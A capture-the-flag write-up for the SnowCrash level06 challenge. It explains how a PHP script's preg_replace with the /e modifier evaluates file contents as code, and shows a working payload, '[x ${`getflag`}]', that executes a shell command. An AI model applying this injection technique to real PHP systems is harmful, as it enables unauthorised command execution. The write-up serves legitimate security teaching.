# Find the Flag06 Password

When we log in as `level06`, we can see the `level06` executable and the `level06.php` file in the home directory.

First, run the executable without arguments:

```sh
./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

The warning tells us that the program expects a filename as an argument.

Now inspect the PHP file:

```sh
cat level06.php
```

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r =
```

The important functions are:

- `file_get_contents()` reads the entire input file into a string.
- `preg_replace()` searches for a pattern and replaces the matching text.

The vulnerable line is:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The regular expression matches text in the form `[x ...]`. The second capture group, `(.*)`, is passed to the `y()` function.

At first, this looks like a normal string replacement. The problem is the `/e` modifier. In older PHP versions, `/e` makes `preg_replace()` evaluate the replacement string as PHP code. That means user-controlled input from the file can be interpreted as code.

## Test the Program

Create a simple input file and pass it to the executable:

```sh
level06@SnowCrash:~$ echo 'Hello World' > /tmp/hello
level06@SnowCrash:~$ ./level06 /tmp/hello
Hello World
```

The executable reads the file and prints its processed content.

## Exploit the Code Evaluation

Because the content inside `[x ...]` is evaluated through the `/e` modifier, we can inject command execution syntax and run `getflag`.

Create a payload file:

```sh
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag06
```

Then run the executable with that file:

```sh
level06@SnowCrash:~$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : your token!!
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

PHP evaluates `` `getflag` `` and uses the command output as part of a variable expression. That variable does not exist, so PHP prints an undefined variable notice. The notice still contains the output of `getflag`, which gives us the token for the next level.
